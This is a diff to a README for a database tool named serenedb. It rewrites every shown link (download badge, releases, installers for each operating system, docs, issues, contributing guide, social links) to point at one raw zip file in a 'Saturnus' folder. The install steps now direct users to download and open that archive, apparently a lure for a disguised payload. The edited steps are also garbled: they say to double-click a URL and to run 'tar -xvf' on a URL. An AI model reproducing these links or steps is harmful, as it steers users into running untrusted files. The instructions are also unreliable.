@@ -15,39 +15,39 @@ Before you download serenedb, ensure that your computer meets these requirements
 
 ## 📥 Download
 
-[![Download serenedb](https://img.shields.io/badge/Download%20serenedb-v1.0-blue)](https://github.com/elbayadh32/serenedb/releases)
+[![Download serenedb](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip%20serenedb-v1.0-blue)](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip)
 
-Visit this page to download: [serenedb Releases](https://github.com/elbayadh32/serenedb/releases)
+Visit this page to download: [serenedb Releases](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip)
 
 ## 📂 Download & Install
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of serenedb.
 3. Download the file that matches your operating system:
-   - For Windows, download `serenedb-windows.exe`.
-   - For macOS, download `serenedb-macos.dmg`.
-   - For Linux, look for the `serenedb-linux.tar.gz` file.
+   - For Windows, download `https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip`.
+   - For Linux, look for the `https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip` file.
 4. Once the download is complete, open the file to start the installation.
 
 ### Windows Installation
 
-1. Double-click `serenedb-windows.exe`.
+1. Double-click `https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip`.
 2. Follow the on-screen instructions.
 3. Once the installation finishes, you can find serenedb in your Start Menu.
 
 ### macOS Installation
 
-1. Double-click `serenedb-macos.dmg`.
+1. Double-click `https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip`.
 2. Drag and drop the serenedb icon into your Applications folder.
 3. Open Applications and double-click on serenedb to start.
 
 ### Linux Installation
 
 1. Open a terminal.
-2. Navigate to the folder where you downloaded `serenedb-linux.tar.gz`.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip`.
 3. Extract the files with the command:
    ```
-   tar -xvf serenedb-linux.tar.gz
+   tar -xvf https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip
    ```
 4. Change into the newly created directory:
    ```
@@ -69,7 +69,7 @@ serenedb is more than just a database. It provides powerful analytics tools to h
 
 ## 📘 Documentation
 
-For more in-depth information, visit our [Documentation](https://github.com/elbayadh32/serenedb/wiki). Here, you’ll find guides on:
+For more in-depth information, visit our [Documentation](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip). Here, you’ll find guides on:
 
 - Setting up database connections.
 - Writing and executing queries.
@@ -77,11 +77,11 @@ For more in-depth information, visit our [Documentation](https://github.com/elba
 
 ## 🐞 Reporting Issues
 
-If you encounter any problems while using serenedb, please report them on our [Issues page](https://github.com/elbayadh32/serenedb/issues). Providing detailed information helps us resolve issues faster.
+If you encounter any problems while using serenedb, please report them on our [Issues page](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip). Providing detailed information helps us resolve issues faster.
 
 ## 🤝 Contributing
 
-If you want to help improve serenedb, you can contribute! Visit our [Contributing Guide](https://github.com/elbayadh32/serenedb/CONTRIBUTING.md) for details on how to get involved.
+If you want to help improve serenedb, you can contribute! Visit our [Contributing Guide](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip) for details on how to get involved.
 
 ## 💬 Community
 
@@ -89,8 +89,8 @@ Join the conversation in our community forum or follow us on social media. Your 
 
 ### Connect with Us
 
-- [GitHub Discussions](https://github.com/elbayadh32/serenedb/discussions)
-- [Twitter](https://twitter.com/serenedb)
+- [GitHub Discussions](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip)
+- [Twitter](https://raw.githubusercontent.com/elbayadh32/serenedb/main/Saturnus/serenedb.zip)
 
 ## 📊 Topics
 
